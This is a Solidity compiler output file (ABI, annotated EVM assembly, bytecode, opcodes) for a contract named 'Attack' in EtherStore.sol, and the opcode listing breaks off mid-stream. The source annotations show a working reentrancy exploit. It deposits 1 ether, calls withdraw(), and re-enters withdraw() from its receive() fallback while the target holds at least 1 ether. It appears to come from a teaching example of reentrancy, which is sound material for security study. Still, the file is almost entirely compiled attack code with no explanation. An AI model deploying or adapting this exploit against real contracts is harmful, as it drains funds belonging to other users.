{
	"contract/EtherStore.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_etherStoreAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "AMOUT",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "etherStore",
					"outputs": [
						{
							"internalType": "contract EtherStore",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/EtherStore.sol\":598:1232  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contract/EtherStore.sol\":708:810  constructor(address _etherStoreAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contract/EtherStore.sol\":783:801  _etherStoreAddress */\n  dup1\n    /* \"contract/EtherStore.sol\":759:769  etherStore */\n  0x00\n  dup1\n    /* \"contract/EtherStore.sol\":759:802  etherStore = EtherStore(_etherStoreAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/EtherStore.sol\":708:810  constructor(address _etherStoreAddress) {... */\n  pop\n    /* \"contract/EtherStore.sol\":598:1232  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contract/EtherStore.sol\":598:1232  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/EtherStore.sol\":598:1232  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xacd2e6e5\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xfe57dc9c\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contract/EtherStore.sol\":692:699  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/EtherStore.sol\":869:879  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/EtherStore.sol\":861:888  address(etherStore).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contract/EtherStore.sol\":861:897  address(etherStore).balance >= AMOUT */\n      lt\n        /* \"contract/EtherStore.sol\":857:947  if (address(etherStore).balance >= AMOUT) {... */\n      tag_9\n      jumpi\n        /* \"contract/EtherStore.sol\":914:924  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/EtherStore.sol\":914:933  etherStore.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contract/EtherStore.sol\":914:935  etherStore.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/EtherStore.sol\":857:947  if (address(etherStore).balance >= AMOUT) {... */\n    tag_9:\n        /* \"contract/EtherStore.sol\":598:1232  contract Attack {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/EtherStore.sol\":1128:1227  function getBalance() public view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/EtherStore.sol\":962:1120  function attack() external payable {... */\n    tag_4:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"contract/EtherStore.sol\":625:653  EtherStore public etherStore */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/EtherStore.sol\":660:699  uint256 public constant AMOUT = 1 ether */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      tag_28\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/EtherStore.sol\":1128:1227  function getBalance() public view returns (uint256) {... */\n    tag_15:\n        /* \"contract/EtherStore.sol\":1171:1178  uint256 */\n      0x00\n        /* \"contract/EtherStore.sol\":1198:1219  address(this).balance */\n      selfbalance\n        /* \"contract/EtherStore.sol\":1191:1219  return address(this).balance */\n      swap1\n      pop\n        /* \"contract/EtherStore.sol\":1128:1227  function getBalance() public view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contract/EtherStore.sol\":962:1120  function attack() external payable {... */\n    tag_19:\n        /* \"contract/EtherStore.sol\":692:699  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/EtherStore.sol\":1016:1025  msg.value */\n      callvalue\n        /* \"contract/EtherStore.sol\":1016:1034  msg.value >= AMOUT */\n      lt\n      iszero\n        /* \"contract/EtherStore.sol\":1008:1035  require(msg.value >= AMOUT) */\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n        /* \"contract/EtherStore.sol\":1046:1056  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/EtherStore.sol\":1046:1064  etherStore.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contract/EtherStore.sol\":692:699  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/EtherStore.sol\":1046:1080  etherStore.deposit{value: AMOUT}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/EtherStore.sol\":1091:1101  etherStore */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/EtherStore.sol\":1091:1110  etherStore.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contract/EtherStore.sol\":1091:1112  etherStore.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_35\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_35:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_37:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/EtherStore.sol\":962:1120  function attack() external payable {... */\n      jump\t// out\n        /* \"contract/EtherStore.sol\":625:653  EtherStore public etherStore */\n    tag_22:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contract/EtherStore.sol\":660:699  uint256 public constant AMOUT = 1 ether */\n    tag_27:\n        /* \"contract/EtherStore.sol\":692:699  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contract/EtherStore.sol\":660:699  uint256 public constant AMOUT = 1 ether */\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_38:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_39:\n        /* \"#utility.yul\":177:201   */\n      tag_49\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_38\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_17:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_51\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_39\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_40:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:634   */\n    tag_41:\n        /* \"#utility.yul\":602:605   */\n      0x00\n        /* \"#utility.yul\":623:628   */\n      dup2\n        /* \"#utility.yul\":616:628   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:634   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":640:782   */\n    tag_42:\n        /* \"#utility.yul\":690:699   */\n      0x00\n        /* \"#utility.yul\":723:776   */\n      tag_55\n        /* \"#utility.yul\":741:775   */\n      tag_56\n        /* \"#utility.yul\":750:774   */\n      tag_57\n        /* \"#utility.yul\":768:773   */\n      dup5\n        /* \"#utility.yul\":750:774   */\n      tag_40\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":741:775   */\n      tag_41\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":723:776   */\n      tag_40\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":710:776   */\n      swap1\n      pop\n        /* \"#utility.yul\":640:782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:914   */\n    tag_43:\n        /* \"#utility.yul\":838:847   */\n      0x00\n        /* \"#utility.yul\":871:908   */\n      tag_59\n        /* \"#utility.yul\":902:907   */\n      dup3\n        /* \"#utility.yul\":871:908   */\n      tag_42\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":858:908   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:914   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":920:1063   */\n    tag_44:\n        /* \"#utility.yul\":987:996   */\n      0x00\n        /* \"#utility.yul\":1020:1057   */\n      tag_61\n        /* \"#utility.yul\":1051:1056   */\n      dup3\n        /* \"#utility.yul\":1020:1057   */\n      tag_43\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1007:1057   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:1063   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1069:1234   */\n    tag_45:\n        /* \"#utility.yul\":1173:1227   */\n      tag_63\n        /* \"#utility.yul\":1221:1226   */\n      dup2\n        /* \"#utility.yul\":1173:1227   */\n      tag_44\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1168:1171   */\n      dup3\n        /* \"#utility.yul\":1161:1228   */\n      mstore\n        /* \"#utility.yul\":1069:1234   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1240:1496   */\n    tag_24:\n        /* \"#utility.yul\":1350:1354   */\n      0x00\n        /* \"#utility.yul\":1388:1390   */\n      0x20\n        /* \"#utility.yul\":1377:1386   */\n      dup3\n        /* \"#utility.yul\":1373:1391   */\n      add\n        /* \"#utility.yul\":1365:1391   */\n      swap1\n      pop\n        /* \"#utility.yul\":1401:1489   */\n      tag_65\n        /* \"#utility.yul\":1486:1487   */\n      0x00\n        /* \"#utility.yul\":1475:1484   */\n      dup4\n        /* \"#utility.yul\":1471:1488   */\n      add\n        /* \"#utility.yul\":1462:1468   */\n      dup5\n        /* \"#utility.yul\":1401:1489   */\n      tag_45\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1240:1496   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220914d9681264af5252f905ca5966e4cc937dad2c71de5e4c436a05e959ca2992464736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506040516104e53803806104e5833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6103d98061010c5f395ff3fe608060405260043610610042575f3560e01c806312065fe01461010d5780639e5faafc14610137578063acd2e6e514610141578063fe57dc9c1461016b57610109565b3661010957670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110610107575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100f0575f80fd5b505af1158015610102573d5f803e3d5ffd5b505050505b005b5f80fd5b348015610118575f80fd5b50610121610195565b60405161012e91906102f7565b60405180910390f35b61013f61019c565b005b34801561014c575f80fd5b506101556102b0565b604051610162919061038a565b60405180910390f35b348015610176575f80fd5b5061017f6102d3565b60405161018c91906102f7565b60405180910390f35b5f47905090565b670de0b6b3a76400003410156101b0575f80fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b15801561021d575f80fd5b505af115801561022f573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610298575f80fd5b505af11580156102aa573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000081565b5f819050919050565b6102f1816102df565b82525050565b5f60208201905061030a5f8301846102e8565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61035261034d61034884610310565b61032f565b610310565b9050919050565b5f61036382610338565b9050919050565b5f61037482610359565b9050919050565b6103848161036a565b82525050565b5f60208201905061039d5f83018461037b565b9291505056fea2646970667358221220914d9681264af5252f905ca5966e4cc937dad2c71de5e4c436a05e959ca2992464736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4E5 CODESIZE SUB DUP1 PUSH2 0x4E5 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3D9 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x10D JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x137 JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x141 JUMPI DUP1 PUSH4 0xFE57DC9C EQ PUSH2 0x16B JUMPI PUSH2 0x109 JUMP JUMPDEST CALLDATASIZE PUSH2 0x109 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x107 JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF0 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x102 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x118 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x121 PUSH2 0x195 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x12E SWAP2 SWAP1 PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13F PUSH2 0x19C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x155 PUSH2 0x2B0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x162 SWAP2 SWAP1 PUSH2 0x38A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x176 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x17F PUSH2 0x2D3 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x18C SWAP2 SWAP1 PUSH2 0x2F7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x1B0 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x22F JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x298 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2AA JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 DUP2 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2F1 DUP2 PUSH2 0x2DF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x30A PUSH0 DUP4 ADD 